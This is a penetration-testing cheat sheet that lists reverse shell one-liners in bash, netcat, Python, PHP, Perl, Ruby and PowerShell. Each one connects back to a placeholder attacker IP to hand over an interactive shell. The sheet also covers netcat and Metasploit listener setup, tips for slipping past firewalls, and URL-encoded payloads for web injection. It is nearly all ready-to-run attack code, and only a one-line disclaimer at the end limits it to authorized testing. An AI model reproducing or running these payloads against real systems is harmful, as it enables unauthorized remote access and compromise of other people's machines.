# Reverse Shell Cheat Sheet

## Online Reverse Shell Generator

[https://revshells.com](https://revshells.com)

## Bash Reverse Shells

```bash
# Creates an interactive bash shell that redirects input/output to a TCP connection
# This establishes a reverse shell to the attacker's machine
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

# Alternative syntax using -c to execute the command
bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

# Same as above but using double quotes (useful for variable substitution)
bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
```

## Netcat Reverse Shells

### Traditional Netcat

```bash
# Uses the -e flag to specify the executable to run after connection
# This creates a reverse shell to the attacker's machine
nc -e /bin/sh 10.0.0.1 8080

# Same as above but using /bin/bash instead of /bin/sh
nc -e /bin/bash 10.0.0.1 8080

# Alternative syntax using -c to specify the command
nc -c bash 10.0.0.1 8080
```

### Netcat without -e flag

```bash
# Creates a named pipe and uses it to redirect input/output to the netcat connection
# This method works when the -e flag isn't available
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f

# Alternative method using two netcat instances on different ports
# The first nc listens for the reverse shell, the second sends input back
nc 10.0.0.1 8080 | /bin/bash | nc 10.0.0.1 8081  # Listener both ports 8080 and 8081
```

## Python Reverse Shells

### Python 2

```python
# Creates a socket connection to the attacker's machine
# Duplicates the socket file descriptors for input, output, and error
# Then executes an interactive shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python 3

```python
# Same as Python 2 version but compatible with Python 3 syntax
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP Reverse Shells

### Basic PHP Shell

```php
# Creates a socket connection to the attacker's machine
# Executes a shell with input/output redirected to the socket
php -r '$sock=fsockopen("10.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP One-liner

```php
# Embeds a bash reverse shell command within PHP code
# Useful for web application exploitation
<?php system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"); ?>
```

## Perl Reverse Shell

```perl
# Creates a socket connection to the attacker's machine
# Redirects standard input, output, and error to the socket
# Then executes an interactive shell
perl -e 'use Socket;$i="10.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby Reverse Shell

```ruby
# Opens a TCP socket to the attacker's machine
# Redirects input/output to the socket and executes a shell
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PowerShell Reverse Shell

```powershell
# Creates a TCP client connection to the attacker's machine
# Reads commands from the socket, executes them, and sends output back
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Listener Commands

### Netcat Listener

```bash
# Listens on port 8080 for incoming reverse shell connections
nc -lvp 8080

# More verbose version showing additional connection details
nc -lvnp 8080  # More verbose
```

### Listener Tools

`penelope` ---> github 
`pwncat-cs` ---> pipx install pwncat-cs

### Metasploit Listener

```bash
# Configures Metasploit to handle reverse shells
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp  # Example payload
set LHOST 10.0.0.1
set LPORT 8080
run
```

## Notes

1. Replace `10.0.0.1` with your attacking machine's IP address or `tun0`
2. Replace `8080` with your desired port number Try using a commun port like 80, 447, ... if trouble with firewall)
3. Some shells may need URL encoding if used in web applications --> cyberchef online tool for enc/decode

## URL Encoded Versions

Common shells URL encoded for web injection:

```bash
# URL encoded version of the basic bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

%62%61%73%68%20%2D%69%20%3E%26%20%2F%64%65%76%2F%74%63%70%2F%31%30%2E%30%2E%30%2E%31%2F%38%30%38%30%20%30%3E%26%31

# URL encoded version of the netcat reverse shell without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f

%72%6D%20%2F%74%6D%70%2F%66%3B%6D%6B%66%69%66%6F%20%2F%74%6D%70%2F%66%3B%63%61%74%20%2F%74%6D%70%2F%66%7C%2F%62%69%6E%2F%73%68%20%2D%69%20%32%3E%26%31%7C%6E%63%20%31%30%2E%30%2E%30%2E%31%20%38%30%38%30%20%3E%2F%74%6D%70%2F%66
```

## Security Note

⚠️ These commands are for educational purposes and authorized penetration testing only. Unauthorized use may be illegal.
